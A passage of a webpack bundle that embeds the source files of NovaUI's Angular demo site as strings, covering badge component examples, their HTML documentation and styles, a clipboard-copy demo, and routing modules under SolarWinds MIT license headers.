OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-customization",\n    templateUrl: "./badge-customization.component.html",\n    styleUrls: ["./badge-customization.component.less"],\n})\nexport class BadgeCustomizationComponent {\n    counter = "999+";\n}\n'},22184:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Basic Usage</h2>\n\n<p>\n    To show badge add <code>.nui-badge-counter</code> class to the element with\n    <code>position: relative</code> CSS rule.\n</p>\n<p>\n    To display desired content, pass a string to the\n    <code>data-before</code> attribute on the element where Badge class applied.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="badge-counter-basic"\n    exampleTitle="Counter Basic Usage"\n>\n    <nui-badge-counter-basic></nui-badge-counter-basic>\n</nui-example-wrapper>\n\n<p>\n    To show badge without content use <code>.nui-badge-empty</code> class to the\n    element with <code>position: relative</code> CSS rule.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="badge-empty-basic"\n    exampleTitle="Empty Basic Usage"\n>\n    <nui-badge-empty-basic></nui-badge-empty-basic>\n</nui-example-wrapper>\n\n<h2>Statuses usage</h2>\n\n<p>Badge provides classes with all system colors that NovaUI uses.</p>\n\n<nui-example-wrapper\n    filenamePrefix="badge-system-statuses"\n    exampleTitle="Statuses Usage"\n>\n    <nui-badge-system-statuses></nui-badge-system-statuses>\n</nui-example-wrapper>\n\n<h2>Color text</h2>\n\n<p>\n    Badge provides class for change color text to black, use\n    <code>.nui-badge-text-black</code> for proper contrast between text and\n    background.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="badge-color-black"\n    exampleTitle="Color Text"\n>\n    <nui-badge-color-black></nui-badge-color-black>\n</nui-example-wrapper>\n\n<h2>Badge customization</h2>\n\n<p>\n    Badge is opened for customization, for this, declare CSS class with\n    <code>:after</code> psuedo-element and apply it to the element.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="badge-customization"\n    exampleTitle="Badge Customization"\n>\n    <nui-badge-customization></nui-badge-customization>\n</nui-example-wrapper>\n\n<h2>Applying badge to the NovaUI elements</h2>\n\n<p>\n    For some NovaUI elements undesirable applying badge classes directly,\n    because badge won\'t be shown. In this case, wrap NovaUI element for example\n    in <code>div</code>, and apply CSS Badge related classes to this wrapper.\n    See <code>nui-textbox</code> example.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="badge-novaui"\n    exampleTitle="Using with NovaUI"\n>\n    <nui-badge-novaui></nui-badge-novaui>\n</nui-example-wrapper>\n'},62272:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="* {\n    margin: 0;\n    padding: 0;\n}\n"},13464:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-docs",\n    templateUrl: "./badge-docs.component.html",\n    styleUrls: ["./badge-docs.component.less"],\n})\nexport class BadgeDocsComponent {}\n'},60648:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-badge-empty"></div>\n'},34912:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="div {\n    position: relative;\n    height: 30px;\n    width: 30px;\n    border: 1px solid #3c3c3c;\n}\n"},28312:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-empty-basic",\n    templateUrl: "./badge-empty-basic.component.html",\n    styleUrls: ["./badge-empty-basic.component.less"],\n})\nexport class BadgeEmptyBasicComponent {}\n'},43822:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h3>Button example:</h3>\n\n<button\n    nui-button\n    type="button"\n    displayStyle="primary"\n    class="nui-badge-counter nui-badge-warning nui-badge-text-black"\n    [attr.data-before]="buttonCounter"\n    i18n\n>\n    Click me!\n</button>\n\n<button\n    nui-button\n    type="button"\n    displayStyle="primary"\n    class="nui-badge-empty"\n    i18n\n>\n    Click me!\n</button>\n\n<h3>Input example:</h3>\n\n<div\n    class="nui-badge-counter nui-badge-info"\n    [attr.data-before]="textboxCounter"\n>\n    <nui-textbox value="example value"> </nui-textbox>\n</div>\n\n<div class="nui-badge-empty nui-badge-critical">\n    <nui-textbox value="example value"> </nui-textbox>\n</div>\n'},75070:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=":host div,\n:host button {\n    display: inline-block;\n    width: 150px;\n    margin: 0 20px 20px 0;\n}\n\ndiv {\n    position: relative;\n    vertical-align: top;\n}\n\nh3 {\n    margin-top: 0;\n}\n"},57258:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-novaui",\n    templateUrl: "./badge-novaui.component.html",\n    styleUrls: ["./badge-novaui.component.less"],\n})\nexport class BadgeNovauiComponent {\n    buttonCounter = "1";\n    textboxCounter = "1";\n}\n'},91724:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-badge-counter nui-badge-critical" data-before="1"></div>\n<div class="nui-badge-counter nui-badge-warning" data-before="10"></div>\n<div class="nui-badge-counter nui-badge-info" data-before="100"></div>\n<div class="nui-badge-counter nui-badge-ok" data-before="999+"></div>\n\n<div class="nui-badge-empty nui-badge-critical"></div>\n<div class="nui-badge-empty nui-badge-warning"></div>\n<div class="nui-badge-empty nui-badge-info"></div>\n<div class="nui-badge-empty nui-badge-ok"></div>\n'},72684:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-badge-empty,\n.nui-badge-counter {\n    display: inline-block;\n    width: 50px;\n    height: 30px;\n    position: relative;\n    margin-right: 20px;\n    border: 1px solid #3c3c3c;\n}\n"},348:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-system-statuses",\n    templateUrl: "./badge-system-statuses.component.html",\n    styleUrls: ["./badge-system-statuses.component.less"],\n})\nexport class BadgeSystemStatusesComponent {}\n'},25580:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-badge-counter nui-badge-critical" data-before="1"></div>\n<div class="nui-badge-counter nui-badge-warning" data-before="10"></div>\n<div class="nui-badge-counter nui-badge-info" data-before="100"></div>\n<div class="nui-badge-counter nui-badge-ok" data-before="999+"></div>\n<div\n    class="nui-badge-counter nui-badge-warning nui-badge-text-black"\n    data-before="999+"\n></div>\n<div\n    class="nui-badge-counter nui-badge-counter-custom"\n    data-before="999+"\n></div>\n\n<div class="nui-badge-empty nui-badge-critical"></div>\n<div class="nui-badge-empty nui-badge-warning"></div>\n<div class="nui-badge-empty nui-badge-info"></div>\n<div class="nui-badge-empty nui-badge-ok"></div>\n<div class="nui-badge-empty nui-badge-empty-custom"></div>\n\n<button\n    nui-button\n    type="button"\n    displayStyle="primary"\n    class="nui-badge-counter nui-badge-warning nui-badge-text-black button-example"\n    data-before="1"\n    i18n\n>\n    Click me!\n</button>\n\n<button\n    nui-button\n    type="button"\n    displayStyle="primary"\n    class="nui-badge-empty button-example"\n    i18n\n>\n    Click me!\n</button>\n\n<div class="nui-badge-counter nui-badge-info textbox-example" data-before="1">\n    <nui-textbox value="example value"> </nui-textbox>\n</div>\n\n<div class="nui-badge-empty nui-badge-critical textbox-example">\n    <nui-textbox value="example value"> </nui-textbox>\n</div>\n'},5100:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="div {\n    display: inline-block;\n    width: 50px;\n    margin: 0 20px 20px 0;\n    position: relative;\n    vertical-align: top;\n}\n\n.button-example,\n.textbox-example {\n    width: auto;\n}\n\n.button-example {\n    margin: 0 20px 20px 0;\n}\n\n.textbox-example {\n    vertical-align: top;\n}\n\n.nui-badge-counter-custom:after {\n    background: #0c5593;\n    border-radius: 0;\n    color: yellow;\n}\n\n.nui-badge-empty-custom:after {\n    background: #6b6ecf;\n    border-radius: 0;\n    transform: rotate(45deg) !important;\n}\n"},41756:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-visual-test",\n    templateUrl: "./badge-visual-test.component.html",\n    styleUrls: ["./badge-visual-test.component.less"],\n})\nexport class BadgeVisualTestComponent {}\n'},32647:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ScrollingModule } from "@angular/cdk/scrolling";\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiMessageModule,\n    NuiTextboxModule,\n} from "@nova-ui/bits";\n\nimport { BadgeColorBlackComponent } from "./badge-color-black/badge-color-black.component";\nimport { BadgeCounterBasicComponent } from "./badge-counter-basic/badge-counter-basic.component";\nimport { BadgeCustomizationComponent } from "./badge-customization/badge-customization.component";\nimport { BadgeDocsComponent } from "./badge-docs/badge-docs.component";\nimport { BadgeEmptyBasicComponent } from "./badge-empty-basic/badge-empty-basic.component";\nimport { BadgeNovauiComponent } from "./badge-novaui/badge-novaui.component";\nimport { BadgeSystemStatusesComponent } from "./badge-system-statuses/badge-system-statuses.component";\nimport { BadgeVisualTestComponent } from "./badge-visual-test/badge-visual-test.component";\n\nconst routes = [\n    {\n        path: "",\n        component: BadgeDocsComponent,\n    },\n    {\n        path: "badge-visual-test",\n        component: BadgeVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    declarations: [\n        BadgeDocsComponent,\n        BadgeCounterBasicComponent,\n        BadgeEmptyBasicComponent,\n        BadgeSystemStatusesComponent,\n        BadgeColorBlackComponent,\n        BadgeCustomizationComponent,\n        BadgeNovauiComponent,\n        BadgeVisualTestComponent,\n    ],\n    imports: [\n        NuiButtonModule,\n        NuiFormFieldModule,\n        NuiDocsModule,\n        NuiMessageModule,\n        NuiTextboxModule,\n        ScrollingModule,\n        RouterModule.forChild(routes),\n    ],\n    exports: [RouterModule],\n})\nexport class BadgeModule {}\n'},86178:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./badge-color-black/badge-color-black.component";\nexport * from "./badge-counter-basic/badge-counter-basic.component";\nexport * from "./badge-counter-basic/badge-counter-basic.component";\nexport * from "./badge-docs/badge-docs.component";\nexport * from "./badge-empty-basic/badge-empty-basic.component";\nexport * from "./badge-novaui/badge-novaui.component";\nexport * from "./badge-system-statuses/badge-system-statuses.component";\nexport * from "./badge-visual-test/badge-visual-test.component";\n'},60800:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<style>\n    .nui-clipboard-demo {\n        max-width: 460px;\n    }\n    .clipboard-panel {\n        display: flex;\n    }\n    .nui-button {\n        height: 30px;\n    }\n</style>\n\n<div class="nui-clipboard-demo">\n    <div class="clipboard-panel">\n        <nui-textbox\n            id="inputTextbox"\n            placeholder="Enter text you want to copy to the clipboard"\n            i18n-placeholder\n            [value]="textToCopy"\n            customBoxWidth="360px"\n            (textChange)="onValueChange($event)"\n            required="true"\n        >\n        </nui-textbox>\n        <button\n            id="clipboardButton"\n            nui-button\n            [nuiClipboard]="textToCopy"\n            (clipboardSuccess)="onClipboardSuccess()"\n            (clipboardError)="onClipboardError()"\n            type="button"\n            icon="copy"\n        >\n            Copy\n        </button>\n    </div>\n    <div class="message-box">\n        <nui-message type="ok" [allowDismiss]="true" *ngIf="copiedSuccessfully">\n            <b i18n>Text was copied to the clipboard!</b>\n        </nui-message>\n        <nui-message\n            type="critical"\n            [allowDismiss]="true"\n            *ngIf="copiedWithError"\n        >\n            <b i18n>Failed to copy text!</b>\n        </nui-message>\n    </div>\n</div>\n'},44480:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-clipboard-demo",\n    templateUrl: "./clipboard.example.component.html",\n})\nexport class ClipboardExampleComponent {\n    public textToCopy: string;\n    public copiedSuccessfully = false;\n    public copiedWithError = false;\n    private timeout: number;\n    private timeoutTime = 3000;\n\n    public onValueChange(changedValue: any): void {\n        this.textToCopy = changedValue;\n    }\n\n    public onClipboardSuccess(): void {\n        this.copiedSuccessfully = true;\n        this.timeout = window.setTimeout(() => {\n            this.copiedSuccessfully = false;\n        }, this.timeoutTime);\n    }\n\n    public onClipboardError(): void {\n        this.copiedSuccessfully = false;\n        this.copiedWithError = true;\n        this.timeout = window.setTimeout(() => {\n            this.copiedWithError = false;\n        }, this.timeoutTime);\n    }\n}\n'},99219:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { DragDropModule } from "@angular/cdk/drag-drop";\nimport { DatePipe } from "@angular/common";\nimport { NgModule, Type } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule, Routes } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiCommonModule,\n    NuiDividerModule,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiIconModule,\n    NuiMessageModule,\n    NuiOverlayModule,\n    NuiPaginatorModule,\n    NuiPanelModule,\n    NuiPopoverModule,\n    NuiProgressModule,\n    NuiRadioModule,\n    NuiRepeatModule,\n    NuiSearchModule,\n    NuiSelectorModule,\n    NuiSelectV2Module,\n    NuiSorterModule,\n    NuiTableModule,\n    NuiTextboxModule,\n    NuiTimeFramePickerModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { DataSourceClientSideFilteringExampleComponent } from "./data-source/client-side/client-side-filtering/client-side-filtering.example.component";\nimport { DataSourceWithSelectionExampleComponent } from "./data-source/client-side/client-side-with-selection/client-side-with-selection.example.component";\nimport { DataSourceModule } from "./data-source/data-source.module";\nimport {\n    ClipboardExampleComponent,\n    DataFilterBasicExampleComponent,\n    DataFilterDocsExampleComponent,\n    DataFilterIsolatedExampleComponent,\n    DataFilterTestComponent,\n    EdgeDetectionServiceExampleComponent,\n    EventPropagationServiceExampleComponent,\n    FilteringIsolatedTimeFramePickerComponent,\n    FilteringTimeFramePickerComponent,\n    NuiDataFilterIsolatedListComponent,\n    NuiDataFilterIsolatedTableComponent,\n    NuiDataFilterListComponent,\n    NuiDataFilterTableComponent,\n    ScrollShadowsExampleComponent,\n    SearchServiceExampleComponent,\n    SetFocusExampleComponent,\n    WelcomePageComponent,\n} from "./index";\nimport { RepeatWithViewportManagerExampleComponent } from "./viewport-manager/repeat-with-viewport-manager/repeat-with-viewport-manager.example.component";\nimport { VirtualViewportManagerDocsComponent } from "./viewport-manager/virtual-viewport-manager-docs/virtual-viewport-manager-docs.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes: Routes = [\n    {\n        path: "",\n        redirectTo: "welcome",\n        pathMatch: "full",\n    },\n    {\n        path: "clipboard",\n        component: ClipboardExampleComponent,\n    },\n    {\n        path: "data-source-client-side-filtering",\n        component: DataSourceClientSideFilteringExampleComponent,\n    },\n    {\n        path: "data-source-client-side-filtering-with-selection",\n        component: DataSourceWithSelectionExampleComponent,\n    },\n    {\n        path: "edge-detection-service",\n        component: EdgeDetectionServiceExampleComponent,\n    },\n    {\n        path: "event-propagation-service",\n        component: EventPropagationServiceExampleComponent,\n    },\n    {\n        path: "scroll-shadows",\n        component: ScrollShadowsExampleComponent,\n    },\n    {\n        path: "search-service",\n        component: SearchServiceExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "set-focus",\n        component: SetFocusExampleComponent,\n    },\n    {\n        path: "data-source-service",\n        loadChildren: async () =>\n            import("./data-source/data-source.module").then(\n                (m) => m.DataSourceModule\n            ) as Promise<any>,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "data-filter-service",\n        component: DataFilterDocsExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "virtual-viewport-manager",\n        component: VirtualViewportManagerDocsComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "data-filter-service-test",\n        component: DataFilterTestComponent,\n    },\n    {\n        path: "badge",\n        loadChildren: async () =>\n            import("./badge/badge.module").then(\n                (m) => m.BadgeModule\n            ) as Promise<any>,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "tag",\n        loadChildren: async () =>\n            import("./tag/tag.module").then((m) => m.TagModule) as Promise<any>,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "tree",\n        loadChildren: async () =>\n            import("./tree/tree.module").then((m) => m.TreeModule) as Promise<\n                Type<any>\n            >,\n    },\n    {\n        path: "welcome",\n        component: WelcomePageComponent,\n    },\n    {\n        path: "unit-conversion-service",\n        loadChildren: async () =>\n            import(\n                "./unit-conversion-service/unit-conversion-service-example.module"\n            ).then((m) => m.UnitConversionServiceExampleModule) as Promise<\n                Type<any>\n            >,\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiDocsModule,\n        DataSourceModule,\n        DragDropModule,\n        NuiButtonModule,\n        NuiMessageModule,\n        NuiRadioModule,\n        NuiDividerModule,\n        NuiCheckboxModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiIconModule,\n        NuiTextboxModule,\n        NuiPaginatorModule,\n        NuiRepeatModule,\n        NuiSearchModule,\n        NuiSelectorModule,\n        NuiSorterModule,\n        NuiExpanderModule,\n        NuiPanelModule,\n        NuiPopoverModule,\n        NuiSelectV2Module,\n        NuiOverlayModule,\n        NuiTableModule,\n        NuiTimeFramePickerModule,\n        RouterModule.forChild(routes),\n        NuiCommonModule,\n        NuiProgressModule,\n    ],\n    declarations: [\n        ClipboardExampleComponent,\n        DataFilterDocsExampleComponent,\n        DataFilterBasicExampleComponent,\n        DataFilterIsolatedExampleComponent,\n        DataFilterTestComponent,\n        NuiDataFilterListComponent,\n        NuiDataFilterTableComponent,\n        NuiDataFilterIsolatedListComponent,\n        NuiDataFilterIsolatedTableComponent,\n        EdgeDetectionServiceExampleComponent,\n        EventPropagationServiceExampleComponent,\n        FilteringTimeFramePickerComponent,\n        FilteringIsolatedTimeFramePickerComponent,\n        ScrollShadowsExampleComponent,\n        SearchServiceExampleComponent,\n        SetFocusExampleComponent,\n        WelcomePageComponent,\n        VirtualViewportManagerDocsComponent,\n        RepeatWithViewportManagerExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("common"),\n        },\n        DatePipe,\n    ],\n    exports: [RouterModule],\n})\nexport default class CommonModule {}\n'},73174:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="p-4" style="border: 1px solid black">\n    <div class="mt-2 mb-2">\n        <nui-filtering-time-frame-picker\n            (timeFrameChanged)="applyFilters()"\n            #timeFramePicker\n        ></nui-filtering-time-frame-picker>\n    </div>\n    <nui-divider></nui-divider>\n    <nui-data-filter-table-example></nui-data-filter-table-example>\n</div>\n'},40354:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person 